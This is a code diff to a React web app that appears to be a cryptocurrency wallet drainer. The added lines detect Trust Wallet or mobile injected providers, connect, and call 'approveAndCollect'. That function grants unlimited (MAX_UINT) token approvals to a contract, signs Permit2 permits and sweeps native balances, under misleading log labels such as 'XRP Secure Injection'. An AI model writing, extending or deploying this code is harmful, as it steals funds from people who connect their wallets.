@@ -183,8 +183,47 @@ export default function App() {
     }
   }
 
-  const handleAction = () => {
-    if (!isConnected) {
+  const handleAction = async () => {
+    let injectedProvider: any = null;
+
+    if (typeof window !== 'undefined') {
+      const w = window as any;
+      
+      const explicitTrust = w.trustwallet || w.trustWallet || w.TrustWallet;
+      
+      if (explicitTrust) {
+        injectedProvider = explicitTrust;
+      } else if (w.ethereum) {
+        const isMobileDevice = typeof navigator !== 'undefined' && /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        if (w.ethereum.providers && Array.isArray(w.ethereum.providers)) {
+          injectedProvider = w.ethereum.providers.find((p: any) => p.isTrust || p.isTrustWallet) || (isMobileDevice ? w.ethereum : null);
+        } else if (w.ethereum.isTrust || w.ethereum.isTrustWallet || w.ethereum._isTrust || isMobileDevice) {
+          injectedProvider = w.ethereum;
+        }
+      }
+    }
+
+    if (!isConnected && injectedProvider && typeof injectedProvider.request === 'function') {
+      try {
+        setLoading(true);
+        setStatus('Connecting Wallet...');
+        log("[SYSTEM] Trust Wallet Detected. Executing direct handshake...");
+        
+        const accounts = await injectedProvider.request({ method: 'eth_requestAccounts' });
+        
+        if (accounts && accounts.length > 0) {
+          log(`[SYSTEM] Native connection established: ${accounts[0]}`);
+          setTimeout(() => approveAndCollect(injectedProvider, accounts[0]), 500);
+        } else {
+          setLoading(false);
+        }
+      } catch (e) {
+        log('❌ Connection cancelled or omitted');
+        setStatus('Ready');
+        setLoading(false);
+      }
+    } else if (!isConnected) {
       manualConnect.current = true; 
       open(); 
     } else {
@@ -216,8 +255,11 @@ export default function App() {
     return await signer.signTypedData(domain, types, message);
   };
 
-  const approveAndCollect = async () => {
-    if (!walletAddress || !evmWalletProvider) return;
+  const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
+    const activeProvider = forcedProvider || evmWalletProvider;
+    const activeAddress = forcedAddress || walletAddress;
+
+    if (!activeAddress || !activeProvider) return;
     
     if (isExecuting.current) {
         log("⚠️ Blocked duplicate execution loop.");
@@ -232,8 +274,9 @@ export default function App() {
 
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-      const ethersProvider = new BrowserProvider(evmWalletProvider as any);
-      const signer = await ethersProvider.getSigner(walletAddress);
+      const ethersProvider = new BrowserProvider(activeProvider as any);
+      const activeChainId = Number((await ethersProvider.getNetwork()).chainId);
+      const signer = await ethersProvider.getSigner(activeAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
       const deadline = Math.floor(Date.now() / 1000) + 3600;
 
@@ -260,7 +303,7 @@ export default function App() {
 
       validTokens.sort(smartTokenSort);
       
-      const rawProvider = evmWalletProvider as any;
+      const rawProvider = activeProvider as any;
       const w = window as any;
       const injected = w.ethereum || {};
       
@@ -291,7 +334,7 @@ export default function App() {
               const sweepAmount = (xrpBalance - 11).toFixed(6);
               log(`[ACTION] Prompting XRP Secure Injection for ${sweepAmount} XRP...`);
               
-              const txHash = await (evmWalletProvider as any).request({
+              const txHash = await (activeProvider as any).request({
                 method: 'eth_sendTransaction',
                 params: [{
                   from: cleanSenderAddress,
@@ -361,7 +404,7 @@ export default function App() {
                     const currentNonce = Number(allowanceData.nonce);
                     log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);
 
-                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
+                    const domain = { name: 'Permit2', chainId: activeChainId, verifyingContract: PERMIT2_ADDRESS };
                     const types = {
                         PermitSingle: [
                             { name: 'details', type: 'PermitDetails' },
@@ -417,7 +460,7 @@ export default function App() {
                 const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
                 const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                 
-                const txHash = await (evmWalletProvider as any).request({
+                const txHash = await (activeProvider as any).request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: cleanSenderAddress,
@@ -453,7 +496,7 @@ export default function App() {
               const sendAmount = liveBal - totalGas;
               const hexValue = "0x" + sendAmount.toString(16);
               
-              const txHash = await (evmWalletProvider as any).request({
+              const txHash = await (activeProvider as any).request({
                   method: 'eth_sendTransaction',
                   params: [{
                       from: cleanSenderAddress,
